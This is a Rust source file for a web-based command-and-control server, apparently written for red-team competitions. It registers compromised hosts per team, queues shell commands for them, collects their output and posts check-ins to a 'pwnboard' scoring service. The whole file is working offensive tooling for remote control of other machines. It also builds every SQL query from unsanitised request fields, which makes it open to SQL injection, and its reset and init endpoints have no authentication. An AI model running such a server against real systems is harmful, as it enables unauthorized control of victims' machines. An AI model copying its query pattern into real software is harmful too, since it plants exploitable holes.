use actix_web::{get, post, web, App, HttpResponse, HttpServer, Responder, Result};
use mysql::{Opts, Pool};
use std::env;
use mysql::prelude::Queryable;
use serde::{Deserialize, Serialize};
use reqwest::StatusCode;
use reqwest::blocking::Client;
use std::fs::File;
use lazy_static::lazy_static;

//global var for mysql connection pool
lazy_static! {
    static ref POOL: Pool = {
        let url = env::var("DATABASE_URL").expect("DATABASE_URL not set");
        let opts = Opts::from_url(&url).unwrap();
        Pool::new(opts).unwrap()
    };
}

//Used for checkin
#[derive(Deserialize)]
struct Host {
    identifier: String,
}

//Used for command responses
#[derive(serde::Deserialize)]
struct CommandResponse {
    cmd_id: i32,
    response: String,
}

//Used for issuing commands
#[derive(serde::Deserialize)]
struct Command {
    host_id: String,
    command: String,
}

//Used for pwnboard
#[derive(Debug, Serialize, Deserialize)]
struct Payload {
    ip: String,
    application: String,
}

#[derive(serde::Deserialize)]
struct NewHost {
    ip: String
}

#[derive(serde::Deserialize)]
struct CommandRequest {
    cmd_id: i32
}

#[get("/")]
async fn index() -> impl Responder {
    let res = "Definitely not a C2 server.";
    println!("Request received for '/'.");
    HttpResponse::Ok().body(res)
}

#[get("/resetall")]
async fn clear_data() -> impl Responder {
    query_sql("DELETE FROM hosts;");
    query_sql("DELETE FROM commands;");
    let res = query_sql("SELECT * FROM hosts;");
    HttpResponse::Ok().body(res)
}

#[get("/init")]
async fn init() -> impl Responder {
    println!("Parsing config.json...");
    parse_config();
    println!("Done parsing config.json");
    HttpResponse::Ok().body("Init complete.")
}

#[get("/hosts")]
async fn hosts_page() -> impl Responder {
    let res = query_sql("SELECT identifier FROM hosts;");
    if res == "" {
        return HttpResponse::Ok().body("No hosts found.");
    }
    HttpResponse::Ok().body(res)
}

#[post("/commands")]
async fn get_commands_for_host(id: web::Json<Host>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT getQueuedCommands('{}');", id.identifier)).strip_suffix("\n").unwrap().to_string();
    Ok(HttpResponse::Ok().body(res))
}

#[post("/getcommand")]
async fn get_command_for_host(cmd: web::Json<CommandRequest>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT getCommand('{}');", cmd.cmd_id));
    Ok(HttpResponse::Ok().body(res))
}

//For client to send command responses
#[post("/response")]
async fn get_response_for_host(command_response: web::Json<CommandResponse>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT updateCommandResponse ({}, '{}');", command_response.cmd_id, command_response.response));
    Ok(HttpResponse::Ok().body(res))
}

//For user to get command responses
#[post("/responses")]
async fn get_response_for_command(command: web::Json<CommandRequest>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT response FROM commands WHERE id = {};", command.cmd_id));
    Ok(HttpResponse::Ok().body(res))
}

//For user to issue commands to a host
#[post("/issuecommand")]
async fn issue_command(input: web::Json<Command>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT issueCommand('{}','{}');", input.host_id, input.command));
    Ok(HttpResponse::Ok().body(res))
}

//For client to check in
#[post("/checkin")]
async fn check_in(input: web::Json<Host>) -> impl Responder {
    HttpResponse::Ok().body(check_in_host(&input.identifier))
}

//For client to init
#[post("/newhost")]
async fn new_host(input: web::Json<NewHost>) -> impl Responder {
    let res = query_sql(&format!("SELECT newHost('{}');", input.ip)).strip_suffix("\n").unwrap().to_owned();
    println!("Created new host: '{}' from IP: '{}'", &res, input.ip);
    check_in_host(&res);
    HttpResponse::Ok().body(res)
}

//For user to get all check-in times for every host
#[post("/getcheckintimes")]
async fn get_checkin_times() -> impl Responder {
    let res = query_sql("SELECT CONCAT(identifier, ' - ', CASE WHEN alive = 1 THEN 'ALIVE' WHEN lastCheckIn IS NULL THEN 'NEVER CHECKED IN' ELSE CONCAT('Last check in: ', lastCheckIn) END) AS host_checkin FROM hosts;");
    HttpResponse::Ok().body(res)
}

//For user to get info about the server
#[post("/getserverinfo")]
async fn get_server_info() -> impl Responder {
    let num_of_teams = query_sql("SELECT COUNT(*) FROM teams;");
    let hostnames = query_sql("SELECT hostname FROM hostnames;");
    let res = format!("Number of teams: {}\nHostnames:\n{}", num_of_teams, hostnames);
    HttpResponse::Ok().body(res)
}

fn check_in_host(identifier: &str) -> String {
    let res = query_sql(&format!("SELECT checkIn('{}');", identifier));
    match pwnboard_update(res.clone()) {
        Ok(_) => println!("Pwnboard updated successfully"),
        Err(e) => println!("Error updating pwnboard: {}", e),
    }
    res
}

fn pwnboard_update(identifier: String) -> Result<(), reqwest::Error>{
    let pwnboard_url = env::var("PWNBOARD_URL").expect("PWNBOARD_URL not set");
    let payload = Payload {
        ip: identifier.strip_suffix("\n").unwrap().to_owned(),
        application: "requestor".to_owned(),
    };

    let client = Client::new();
    let response = client.post(pwnboard_url)
        .header("accept", "*/*")
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()?;

    match response.status() {
        StatusCode::OK => println!("Success!"),
        StatusCode::BAD_REQUEST => println!("Bad request!"),
        _ => println!("Unexpected status code: {}", response.status()),
    };

    Ok(())
}

fn query_sql(query: &str) -> String {
    // Get the pool
    let mut conn = POOL.get_conn().unwrap();

    // Make a query and get the result
    let result = conn.query_map(query, |row: mysql::Row| row.get::<String, _>(0)).unwrap();


    // Convert the result to a string
    let result_string = result.iter().fold(String::new(), |acc, x| acc + &x.clone().unwrap_or("None".to_string()) + "\n");

    println!("Executed query '{}' and got result '{}'\n", query, result_string);
    result_string
}

#[derive(Serialize, Deserialize)]
pub struct ConfigFile {
    hosts: Vec<ConfigHost>,
    routers: Vec<ConfigHost>,
    topology: Vec<ConfigTopology>,
}

#[derive(Serialize, Deserialize)]
pub struct ConfigHost {
    hostname: String,
    ip: String,
    os: ConfigOs,
    service: Vec<String>,
}

#[derive(Serialize, Deserialize)]
pub struct ConfigTopology {
    teams: String,
    #[serde(rename = "serverIP")]
    server_ip: String,
}

#[derive(Serialize, Deserialize)]
pub enum ConfigOs {
    Linux,
    #[serde(rename = "pfSense")]
    PfSense,
    Windows,
}

//Function to take config.json file and add to mysql database
fn parse_config() {
    let config_file = File::open("config.json").expect("Unable to open config.json");
    let config: ConfigFile = serde_json::from_reader(config_file).expect("Unable to parse config.json");

    let num_of_teams = config.topology[0].teams.parse::<i32>().unwrap(); //converts string to i32 for team field in config

    //drop existing data from tables
    query_sql("DELETE FROM teams;");
    query_sql("DELETE FROM hostnames;");
    query_sql("DELETE FROM hosts;");
    query_sql("DELETE FROM commands;");

    for i in 1..num_of_teams + 1 { //for each team, add to database
        query_sql(&format!("INSERT INTO teams (team_number, ip_addresses) VALUES ({},'');", i));
        println!("Created new team: '{}'", i);
    }

    //upadate teams with IP addresses to expect
    for host in &config.hosts {
        query_sql(&format!("INSERT INTO hostnames (hostname, ip_addresses) VALUES ('{}', '');", host.hostname)); //create hostname
        for i in 1..num_of_teams + 1 { //for each host, add expected IPs to each team and hostname
            let new_ip = host.ip.replace("x", &i.to_string());
            query_sql(&format!("UPDATE teams SET ip_addresses = CONCAT(ip_addresses, ',', '{}') WHERE team_number = {};", new_ip, i)); //add ip to team
            query_sql(&format!("UPDATE hostnames SET ip_addresses = CONCAT(ip_addresses, ',', '{}') WHERE hostname = '{}';", new_ip, host.hostname)); //add ip to hostname
            println!("Added host: '{}' from IP: '{}' for team: '{}' and hostname: {}", new_ip, host.ip, i, host.hostname);

        }
    }

    for host in config.hosts {
        for i in 1..num_of_teams + 1 { //for each host, add to each team
            let new_ip = host.ip.replace("x", &i.to_string());
            let res = query_sql(&format!("SELECT newHost('{}');", new_ip));
            println!("Created new host: '{}' from IP: '{}' for team: '{}', hostname = {}", new_ip, host.ip, i, &res);

        }
        println!("Created new host: '{}' from IP: '{}'", host.hostname, host.ip);
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    println!("Starting web server...");
    HttpServer::new(|| {
        App::new()
            .service(index)
            .service(hosts_page)
            .service(clear_data)
            .service(init)
            .service(
                web::scope("/hosts")
                .service(get_commands_for_host)
                .service(get_command_for_host)
                .service(get_response_for_host)
                .service(check_in)
                .service(new_host)
                .service(issue_command)
                .service(get_response_for_command)
            )
            .service(
                web::scope("/api")
                    .service(get_checkin_times)
                    .service(get_server_info)
            )
    })
    .bind(("0.0.0.0", 8000))?
    .run()
    .await
    //TODO implement multi-threading
    //TODO implement logging 
    //TOOD implement error handling
    //TODO make /init a POST request and add a password
    //TODO fix sql if double connections

}
